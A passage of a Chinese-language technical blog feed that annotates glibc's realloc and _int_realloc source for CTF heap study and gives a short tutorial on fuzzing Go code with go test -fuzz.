class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_realloc (<span class="hljs-type">void</span> *oldmem, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  INTERNAL_SIZE_T nb;         <span class="hljs-comment">/* padded request size */</span><br> <br>  <span class="hljs-type">void</span> *newp;             <span class="hljs-comment">/* chunk to return */</span><br>  <span class="hljs-comment">// 调用 __realloc_hook</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) =<br>    atomic_forced_read (__realloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>  <span class="hljs-comment">// 如果 bytes 为 0 则相当于 free(oldmem)</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> REALLOC_ZERO_BYTES_FREES</span><br>  <span class="hljs-keyword">if</span> (bytes == <span class="hljs-number">0</span> &amp;&amp; oldmem != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      __libc_free (oldmem); <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-comment">// 如果 oldmem 为 NULL 相当于 malloc(bytes)</span><br>  <span class="hljs-comment">/* realloc of null is supposed to be same as malloc */</span><br>  <span class="hljs-keyword">if</span> (oldmem == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> __libc_malloc (bytes);<br> <br>  <span class="hljs-comment">// 获取 oldmem 对应的 chunk 的指针和大小</span><br>  <span class="hljs-comment">/* chunk corresponding to oldmem */</span><br>  <span class="hljs-type">const</span> mchunkptr oldp = mem2chunk (oldmem);<br>  <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);<br>  <span class="hljs-comment">// 寻找 oldp 对应的 arena</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (oldp))<br>    ar_ptr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">else</span><br>    ar_ptr = arena_for_chunk (oldp);<br> <br>  <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">     allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">     Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">     here by accident or by &quot;design&quot; from some intruder.  */</span><br>  <span class="hljs-comment">// 检查 oldp + oldsize 是否超过地址上限</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) oldp &gt; (<span class="hljs-type">uintptr_t</span>) -oldsize, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (oldp), <span class="hljs-number">0</span>))<br>    &#123;<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;realloc(): invalid pointer&quot;</span>, oldmem,<br>               ar_ptr);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  <span class="hljs-comment">// 检查如果申请最小的 chunk 是否会超过地址上限</span><br>  checked_request2size (bytes, nb);<br> <br>  <span class="hljs-comment">// 如果是 mmap 得到的内存会单独处理</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (oldp))<br>    &#123;<br>      <span class="hljs-type">void</span> *newmem;<br> <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_MREMAP</span><br>      <span class="hljs-comment">// 如果是 mmap 得到的内存则利用 mremap 系统调用实现 realloc。</span><br>      <span class="hljs-comment">// mremap 会重新分配一块内存并将之前的数据复制到新的内存上。</span><br>      newp = mremap_chunk (oldp, nb);<br>      <span class="hljs-keyword">if</span> (newp)<br>        <span class="hljs-keyword">return</span> chunk2mem (newp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-comment">/* Note the extra SIZE_SZ overhead. */</span><br>      <span class="hljs-keyword">if</span> (oldsize - SIZE_SZ &gt;= nb)<br>        <span class="hljs-keyword">return</span> oldmem;                         <span class="hljs-comment">/* do nothing */</span><br> <br>      <span class="hljs-comment">/* Must alloc, copy, free. */</span><br>      <span class="hljs-comment">// 如果 mremap 获取不到所需的内存则通过 malloc 获取内存，并将原先内存的数据复制过来然后 munmap 将原先的内存释放掉</span><br>      newmem = __libc_malloc (bytes);<br>      <span class="hljs-keyword">if</span> (newmem == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;              <span class="hljs-comment">/* propagate failure */</span><br> <br>      <span class="hljs-built_in">memcpy</span> (newmem, oldmem, oldsize - <span class="hljs-number">2</span> * SIZE_SZ);<br>      munmap_chunk (oldp);<br>      <span class="hljs-keyword">return</span> newmem;<br>    &#125;<br> <br>  (<span class="hljs-type">void</span>) mutex_lock (&amp;ar_ptr-&gt;mutex);<br> <br>  <span class="hljs-comment">// 调用 _int_realloc 调整内存</span><br>  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);<br> <br>  (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">// 检查内存分配后的 3 种情况</span><br>  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (newp)));<br> <br>  <span class="hljs-comment">// 如果 _int_realloc 没有成功则尝试调用 _int_malloc 重新分配内存</span><br>  <span class="hljs-keyword">if</span> (newp == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Try harder to allocate memory in other arenas.  */</span><br>      LIBC_PROBE (memory_realloc_retry, <span class="hljs-number">2</span>, bytes, oldmem);<br>      newp = __libc_malloc (bytes);<br>      <span class="hljs-comment">// 如果 malloc 成功则将数据拷贝后释放原先的内存</span><br>      <span class="hljs-keyword">if</span> (newp != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-built_in">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);<br>          _int_free (ar_ptr, oldp, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br> <br>  <span class="hljs-keyword">return</span> newp;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="int-realloc"><a href="#int-realloc" class="headerlink" title="int_realloc"></a><code>int_realloc</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// _int_realloc函数用于重新分配内存块。它尝试更改内存块的大小并可能移动它以满足新的大小要求。</span><br><span class="hljs-comment">// 参数:</span><br><span class="hljs-comment">// av - 指向内存状态的指针。</span><br><span class="hljs-comment">// oldp - 指向当前内存块的指针。</span><br><span class="hljs-comment">// oldsize - 当前内存块的大小。</span><br><span class="hljs-comment">// nb - 请求的新大小。</span><br><span class="hljs-type">void</span>* _int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize, INTERNAL_SIZE_T nb) &#123;<br>  <span class="hljs-comment">// 定义一系列局部变量来存储分配的状态和中间结果。</span><br>  mchunkptr newp; <span class="hljs-comment">// 新分配的内存块指针。</span><br>  INTERNAL_SIZE_T newsize; <span class="hljs-comment">// 新内存块的大小。</span><br>  <span class="hljs-type">void</span>* newmem; <span class="hljs-comment">// 对应用户内存的指针。</span><br> <br>  mchunkptr next; <span class="hljs-comment">// 指向oldp后面的连续内存块。</span><br> <br>  mchunkptr remainder; <span class="hljs-comment">// 新分配内存后剩余的内存块。</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size; <span class="hljs-comment">// 剩余内存块的大小。</span><br> <br>  mchunkptr bck; <span class="hljs-comment">// 用于链接的临时变量。</span><br>  mchunkptr fwd; <span class="hljs-comment">// 用于链接的临时变量。</span><br> <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> copysize; <span class="hljs-comment">// 需要复制的字节数。</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ncopies; <span class="hljs-comment">// 需要复制的INTERNAL_SIZE_T字数。</span><br>  INTERNAL_SIZE_T* s; <span class="hljs-comment">// 复制源的指针。</span><br>  INTERNAL_SIZE_T* d; <span class="hljs-comment">// 复制目标的指针。</span><br> <br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 用于错误处理的字符串。</span><br> <br>  <span class="hljs-comment">// 检查oldp的大小是否合法。</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect(oldp-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || __builtin_expect(oldsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;realloc(): invalid old size&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br> <br>  check_inuse_chunk(av, oldp); <span class="hljs-comment">// 检查oldp是否正在使用中。</span><br> <br>  assert(!chunk_is_mmapped(oldp)); <span class="hljs-comment">// 确保oldp不是映射内存。</span><br> <br>  next = chunk_at_offset(oldp, oldsize); <span class="hljs-comment">// 计算下一个内存块的位置。</span><br>  INTERNAL_SIZE_T nextsize = chunksize(next); <span class="hljs-comment">// 获取下一个内存块的大小。</span><br>  <span class="hljs-comment">// 检查下一个内存块的大小是否合法。</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect(next-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;realloc(): invalid next size&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br> <br>  <span class="hljs-comment">// 如果当前内存块已经足够大，则直接返回当前内存块。</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(oldsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb)) &#123;<br>    newp = oldp;<br>    newsize = oldsize;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果下一个内存块是 top chunk ，并且可以合并以满足请求的大小，则进行合并。</span><br>    <span class="hljs-keyword">if</span> (next == av-&gt;top &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(newsize = oldsize + nextsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb + MINSIZE)) &#123;<br>      set_head_size(oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>      av-&gt;top = chunk_at_offset(oldp, nb);<br>      set_head(av-&gt;top, (newsize - nb) | PREV_INUSE);<br>      check_inuse_chunk(av, oldp);<br>      <span class="hljs-keyword">return</span> chunk2mem(oldp);<br>    &#125;<br>    <span class="hljs-comment">// 如果下一个内存块不在使用中，并且可以合并以满足请求的大小，则进行合并。</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (next != av-&gt;top &amp;&amp; !inuse(next) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(newsize = oldsize + nextsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb)) &#123;<br>      newp = oldp;<br>      unlink(av, next, bck, fwd);<br>    &#125;<br>    <span class="hljs-comment">// 否则，分配新内存，复制数据，然后释放旧内存。</span><br>    <span class="hljs-keyword">else</span> &#123;<br>      newmem = _int_malloc(av, nb - MALLOC_ALIGN_MASK);<br>      <span class="hljs-keyword">if</span> (newmem == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 如果分配失败，则返回0。</span><br> <br>      newp = mem2chunk(newmem);<br>      newsize = chunksize(newp);<br> <br>      <span class="hljs-comment">// 如果新分配的内存块紧跟在旧内存块后面，则合并这两个内存块。</span><br>      <span class="hljs-keyword">if</span> (newp == next) &#123;<br>        newsize += oldsize;<br>        newp = oldp;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 否则，复制旧内存块的内容到新内存块。</span><br>        copysize = oldsize - SIZE_SZ;<br>        s = (INTERNAL_SIZE_T*)(chunk2mem(oldp));<br>        d = (INTERNAL_SIZE_T*)(newmem);<br>        ncopies = copysize / <span class="hljs-keyword">sizeof</span>(INTERNAL_SIZE_T);<br>        assert(ncopies &gt;= <span class="hljs-number">3</span>);<br> <br>        <span class="hljs-keyword">if</span> (ncopies &gt; <span class="hljs-number">9</span>)<br>          <span class="hljs-built_in">memcpy</span>(d, s, copysize);<br>        <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 对于小内存块，使用手动复制以提高效率。</span><br>          *(d + <span class="hljs-number">0</span>) = *(s + <span class="hljs-number">0</span>);<br>          *(d + <span class="hljs-number">1</span>) = *(s + <span class="hljs-number">1</span>);<br>          *(d + <span class="hljs-number">2</span>) = *(s + <span class="hljs-number">2</span>);<br>          <span class="hljs-keyword">if</span> (ncopies &gt; <span class="hljs-number">4</span>) &#123;<br>            *(d + <span class="hljs-number">3</span>) = *(s + <span class="hljs-number">3</span>);<br>            *(d + <span class="hljs-number">4</span>) = *(s + <span class="hljs-number">4</span>);<br>            <span class="hljs-keyword">if</span> (ncopies &gt; <span class="hljs-number">6</span>) &#123;<br>              *(d + <span class="hljs-number">5</span>) = *(s + <span class="hljs-number">5</span>);<br>              *(d + <span class="hljs-number">6</span>) = *(s + <span class="hljs-number">6</span>);<br>              <span class="hljs-keyword">if</span> (ncopies &gt; <span class="hljs-number">8</span>) &#123;<br>                *(d + <span class="hljs-number">7</span>) = *(s + <span class="hljs-number">7</span>);<br>                *(d + <span class="hljs-number">8</span>) = *(s + <span class="hljs-number">8</span>);<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br> <br>        _int_free(av, oldp, <span class="hljs-number">1</span>); <span class="hljs-comment">// 释放旧内存块。</span><br>        check_inuse_chunk(av, newp); <span class="hljs-comment">// 检查新内存块是否正在使用中。</span><br>        <span class="hljs-keyword">return</span> chunk2mem(newp); <span class="hljs-comment">// 返回新内存块的用户可用部分。</span><br>      &#125;<br>    &#125;<br>  &#125;<br> <br>  <span class="hljs-comment">// 尝试释放新内存块中的多余空间。</span><br>  assert((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(newsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb));<br>  remainder_size = newsize - nb;<br>  <span class="hljs-comment">// 如果剩余空间太小，无法分割为独立的内存块，则保留它。</span><br>  <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE) &#123;<br>    set_head_size(newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_inuse_bit_at_offset(newp, newsize);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 否则，分割剩余空间为独立的内存块。</span><br>    remainder = chunk_at_offset(newp, nb);<br>    set_head_size(newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_inuse_bit_at_offset(remainder, remainder_size); <span class="hljs-comment">// 标记剩余部分为正在使用中，以便_free()不会报错。</span><br>    _int_free(av, remainder, <span class="hljs-number">1</span>); <span class="hljs-comment">// 释放剩余部分。</span><br>  &#125;<br> <br>  check_inuse_chunk(av, newp); <span class="hljs-comment">// 检查新内存块是否正在使用中。</span><br>  <span class="hljs-keyword">return</span> chunk2mem(newp); <span class="hljs-comment">// 返回新内存块的用户可用部分。</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p>参考：ptmalloc内存管理分析<br>参考：看雪pwn探索篇<br>参考：<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">Understanding glibc malloc – sploitF-U-N</a><br>参考：<a href="https://a1ex.online/2020/09/28/glibc-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#%E9%87%8D%E8%A6%81%E5%87%BD%E6%95%B0-1">glibc-malloc源码分析 | A1ex’s Blog</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE利用入门</title>
      <link href="/2025/07/01/ctf/heap/io-file/"/>
      <url>/2025/07/01/ctf/heap/io-file/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go Fuzz</title>
      <link href="/2025/07/01/fuzz/go-fuzz/"/>
      <url>/2025/07/01/fuzz/go-fuzz/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>传统的 AFL、libFuzzer 和 honggfuzz 主要支持用 C&#x2F;C++ 语言开发的项目。但是现在随着 Rust、Go 等新兴编译型语言的兴起，相应的出现了对这些语言开发的项目进行 Fuzz 的需求。因此，人们在基于传统的 Fuzz 思想的基础上，逐步为这些语言构建了专门的 Fuzz 工具。本文所要学习的 cargo-fuzz 和 afl.rs 正是如此。</p><p>对 Go 程序的 Fuzz 工具有官方提供的<code>go test -fuzz</code>和第三方的<code>go-fuzz</code>。</p><p>Go官方团队的Fuzzing实现借鉴了go-fuzz的设计思想。</p><p>Go 1.18把Fuzzing整合到了<code>go test</code>工具链和<code>testing</code>包里。</p><p>go-fuzz 基于 AFL&#x2F;libFuzzer的变异策略，而 go test 使用的是自研的变异算法。</p><p>Go-fuzz 是一个用于Go语言包的覆盖率引导模糊测试解决方案。它主要用于测试处理复杂输入（文本或二进制）的包，特别适合强化处理潜在恶意用户输入的系统（如网络服务）。</p><p>下面是一个模糊测试的示例，突出显示了其主要的组件。</p><p><img src="/Linux/assets/Pasted%20image%2020250531230716.png"></p><h2 id="官方Fuzz"><a href="#官方Fuzz" class="headerlink" title="官方Fuzz"></a>官方Fuzz</h2><p>和 go-fuzz 不同，go test fuzz 是官方 test 工具的集成。也有很多地方参考了 go-fuzz。</p><h3 id="前期工作"><a href="#前期工作" class="headerlink" title="前期工作"></a>前期工作</h3><p>创建一个以<code>_test.go</code>结尾的测试文件。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 官方模糊测试示例</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FuzzParseURL</span><span class="hljs-params">(f *testing.F)</span></span> &#123;<br>    f.Add(<span class="hljs-string">&quot;https://example.com&quot;</span>) <span class="hljs-comment">// 种子输入</span><br>    f.Fuzz(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T, s <span class="hljs-type">string</span>)</span></span> &#123;<br>        <span class="hljs-keyword">if</span> _, err := url.Parse(s); err != <span class="hljs-literal">nil</span> &#123;<br>            t.Skip() <span class="hljs-comment">// 忽略无效输入</span><br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>初始化 Go 模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir fuzz_test<br><br>go mod init fuzz_test     <br></code></pre></td></tr></table></figure><p>模糊测试必须遵循以下规则：</p><ol><li>测试函数必须命名为<code>FuzzXxx</code>格式，仅接受<code>*testing.F</code>参数，无返回值</li><li>模糊测试必须位于<code>*_test.go</code>文件中才能执行</li><li>模糊目标必须是通过<code>(*testing.F).Fuzz</code>调用的方法，第一个参数为<code>*testing.T</code>，后接模糊参数，无返回值</li><li>每个模糊测试只能有一个模糊目标</li><li>所有种子语料条目必须与模糊参数类型完全匹配且顺序一致（适用于<code>(*testing.F).Add</code>调用和testdata&#x2F;fuzz目录中的语料文件）</li></ol><p>零配置：只需在测试函数前添加<code>func FuzzXxx(f *testing.F)</code></p><p>自动生成种子：基于<code>f.Add()</code>提供的初始输入进行变异。</p><p>与<code>go test</code>无缝集成：支持并行测试、覆盖率报告等。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 官方模糊测试示例</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FuzzParseURL</span><span class="hljs-params">(f *testing.F)</span></span> &#123;<br>    f.Add(<span class="hljs-string">&quot;https://example.com&quot;</span>) <span class="hljs-comment">// 种子输入</span><br>    f.Fuzz(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T, s <span class="hljs-type">string</span>)</span></span> &#123;<br>        <span class="hljs-keyword">if</span> _, err := url.Parse(s); err != <span class="hljs-literal">nil</span> &#123;<br>            t.Skip() <span class="hljs-comment">// 忽略无效输入</span><br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>种子语料库：</p><ul><li>使用 <code>f.Add()</code> 添加初始测试用例</li><li>这些用例会被保存到 <code>testdata/fuzz/FuzzTestName</code> 目录</li><li>后续运行会自动使用这些用例作为起点</li></ul><h3 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">运行模糊测试（默认会无限运行）</span><br>go test -fuzz=FuzzReverse<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">限制运行时间（10秒）</span><br>go test -fuzz=FuzzReverse -fuzztime=10s<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">只运行种子语料库不进行模糊测试</span><br>go test -run=FuzzReverse<br></code></pre></td></tr></table></figure><p>有两种运行模式：</p><ul><li>单元测试模式（默认<code>go test</code>）</li><li>模糊测试模式（<code>go test -fuzz=FuzzTestName</code>）</li></ul><p>默认情况下，每个种子语料条目都会作为单元测试执行。启用模糊测试后，匹配的测试会持续运行直到发现错误。</p><p><img src="/Linux/assets/Pasted%20image%2020250601212322.png"></p><p>我们的上述 Fuzz 中在处理<code>\xde</code>字节时出现了一个问题，</p><h3 id="失败处理"><a href="#失败处理" class="headerlink" title="失败处理"></a>失败处理</h3><p>当出现以下情况会触发失败：</p><ol><li>代码或测试发生panic</li><li>调用<code>t.Fail</code>等失败方法</li><li>不可恢复错误（如os.Exit）</li><li>执行超时（默认1秒）</li></ol><p>失败时会自动最小化输入并保存到<code>testdata/fuzz/</code>目录，可作为回归测试用例。</p><h3 id="自定义设置"><a href="#自定义设置" class="headerlink" title="自定义设置"></a>自定义设置</h3><p>常用参数：</p><ul><li><code>-fuzztime</code>：运行时长&#x2F;次数（默认无限）</li><li><code>-fuzzminimizetime</code>：最小化尝试时长（默认60秒，0表示禁用）</li><li><code>-parallel</code>：并行进程数（默认GOMAXPROCS）</li></ul><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>当发现崩溃时：</p><ul><li>查看 <code>testdata/fuzz/FuzzTestName/</code> 中的崩溃用例</li><li>使用 <code>-run</code> 参数单独运行崩溃用例：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go test -run=FuzzReverse/058293736f23eabc<br></code></pre></td></tr></table></figure><ul><li>使用调试器分析</li></ul><figure class="highlight 